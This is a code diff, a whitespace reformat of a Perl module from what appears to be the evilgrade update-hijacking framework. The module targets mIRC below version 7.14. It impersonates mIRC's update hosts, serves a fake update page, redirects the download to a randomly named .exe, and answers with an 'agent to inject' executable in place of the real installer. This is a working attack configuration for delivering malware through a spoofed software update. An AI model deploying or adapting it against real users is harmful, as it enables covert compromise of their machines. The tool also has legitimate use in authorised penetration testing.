@@ -27,63 +27,65 @@ use Data::Dump qw(dump);
 
 use isrcore::utils;
 
-my $base=
-{
-    'name' => 'Mirc',
-    'version' => '1.0',
-    'appver'  => '< 7.14',
-    'author' => [ 'Francisco Amato < famato +[AT]+ infobytesec.com>' ],
-    'description' => qq{},    
-    'vh' => '(www.mirc.com|www.mirc.co.uk|update1.mirc.com)',
-    'request' => [
-		    {
-		    'req' => '/update.html', #regex friendly
-		    'type' => 'file', #file|string|agent|install
-		    'method' => '', #any
-		    'bin'    => 0,
-		    'string' => '',
-		    'parse' => 1,
-		    'file' => './include/mirc/update.html',
-		    },
-                    {
-                    'req' => '/get.html', #regex anything
-                    'type' => 'string', #file|string|agent|install
-                    'method' => '', #any
-                    'bin'    => '',
-                    'string' => '',
-                    'parse' => '1',
-                    'file' => '',
-                    'cheader' => "HTTP/1.1 302 Found\r\n"
-                                 ."Location: http://www.mirc.com/mirc<%RND1%>.exe \r\n"
-                                 ."Content-Length: 0 \r\n"
-                                 . "Connection: close \r\n\r\n",
-                    },
-		    
-		    {
-		    'req' => '.exe', #regex friendly
-		    'type' => 'agent', #file|string|agent|install
-		    'method' => '', #any
-		    'bin'    => 1,		    
-		    'string' => '',
-		    'parse' => 0,
-		    'file' => ''
-		    },
-		    
+my $base = {
+    'name'        => 'Mirc',
+    'version'     => '1.0',
+    'appver'      => '< 7.14',
+    'author'      => ['Francisco Amato < famato +[AT]+ infobytesec.com>'],
+    'description' => qq{},
+    'vh'          => '(www.mirc.com|www.mirc.co.uk|update1.mirc.com)',
+    'request'     => [
+        {   'req'    => '/update.html',    #regex friendly
+            'type'   => 'file',            #file|string|agent|install
+            'method' => '',                #any
+            'bin'    => 0,
+            'string' => '',
+            'parse'  => 1,
+            'file' => './include/mirc/update.html',
+        },
+        {   'req'     => '/get.html',               #regex anything
+            'type'    => 'string',                  #file|string|agent|install
+            'method'  => '',                        #any
+            'bin'     => '',
+            'string'  => '',
+            'parse'   => '1',
+            'file'    => '',
+            'cheader' => "HTTP/1.1 302 Found\r\n"
+                . "Location: http://www.mirc.com/mirc<%RND1%>.exe \r\n"
+                . "Content-Length: 0 \r\n"
+                . "Connection: close \r\n\r\n",
+        },
+
+        {   'req'    => '.exe',                     #regex friendly
+            'type'   => 'agent',                    #file|string|agent|install
+            'method' => '',                         #any
+            'bin'    => 1,
+            'string' => '',
+            'parse'  => 0,
+            'file'   => ''
+        },
 
     ],
-    #Options		    
-    'options' => {  'agent'  => { 'val' => './agent/agent.exe', 'desc' => 'Agent to inject'},
-		    'enable' => { 'val' => 1, 
-			    	  'desc' => 'Status'},
-                    'version'  => { 'val' => '\'7.\'.isrcore::utils::RndNum(2)',
-                                  'hidden' => 1,
-                                'dynamic' =>1,
-				},
-                    'rnd1'  => { 'val' => 'isrcore::utils::RndNum(5)',
-                                  'hidden' => 1,
-                                'dynamic' =>1,
-                            }			    	  
-		 }
+
+    #Options
+    'options' => {
+        'agent' =>
+            { 'val' => './agent/agent.exe', 'desc' => 'Agent to inject' },
+        'enable' => {
+            'val'  => 1,
+            'desc' => 'Status'
+        },
+        'version' => {
+            'val'     => '\'7.\'.isrcore::utils::RndNum(2)',
+            'hidden'  => 1,
+            'dynamic' => 1,
+        },
+        'rnd1' => {
+            'val'     => 'isrcore::utils::RndNum(5)',
+            'hidden'  => 1,
+            'dynamic' => 1,
+        }
+    }
 };
 
 ##########################################################################
@@ -96,5 +98,5 @@ sub new {
     my $class = shift;
     my $self = { 'Base' => $base, @_ };
     return bless $self, $class;
-}            
+}
 1;
